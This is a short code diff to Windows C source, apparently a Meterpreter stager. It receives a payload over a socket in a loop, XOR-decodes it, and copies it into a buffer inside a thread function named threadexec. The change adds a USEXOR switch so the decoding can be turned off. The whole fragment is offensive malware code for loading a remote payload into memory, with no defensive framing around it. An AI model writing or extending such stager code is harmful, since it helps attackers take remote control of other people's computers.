@@ -15,6 +15,8 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
+#define USEXOR 1
+
 int initwsa();
 short getcinfo(char *,char *,int);
 void xor(char *,int);
@@ -88,7 +90,9 @@ DWORD WINAPI threadexec(LPVOID exename){
 
 	do{
 		response = recv(meterpretersock, recvbuf, 1024, 0);
-		xor(&recvbuf[0],response);
+		if(USEXOR){
+			xor(&recvbuf[0],response);
+		}
 		memcpy(payload,recvbuf,response);
 		payload += response;
 		total += response;
